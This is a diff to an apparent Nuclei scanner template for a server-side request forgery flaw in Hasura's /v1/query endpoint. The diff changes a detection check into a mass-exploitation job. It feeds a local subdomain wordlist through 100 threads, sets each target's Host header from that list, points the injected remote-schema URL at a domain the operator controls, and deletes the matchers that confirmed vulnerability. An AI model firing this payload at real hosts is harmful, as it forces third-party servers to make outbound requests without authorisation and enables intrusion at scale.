@@ -4,13 +4,18 @@ info:
   author: princechaddha
   severity: high
   reference: https://cxsecurity.com/issue/WLB-2021040115
-  tags: hasura
+  tags: hasura,ssrf
 
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST /v1/query HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
         Content-Length: 381
         User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
         content-type: application/json
@@ -27,7 +32,7 @@ requests:
                  "args":{
                     "name":"test",
                     "definition":{
-                       "url":"https://{{interactsh-url}}",
+                       "url":"https://{{Host}}.{{Port}}.{{Subdomains}}.hasura.{{MY-DOMAIN}}",
                        "headers":[
                        ],
                        "timeout_seconds":60,
@@ -37,14 +42,3 @@ requests:
               }
            ]
         }
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 400
-
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
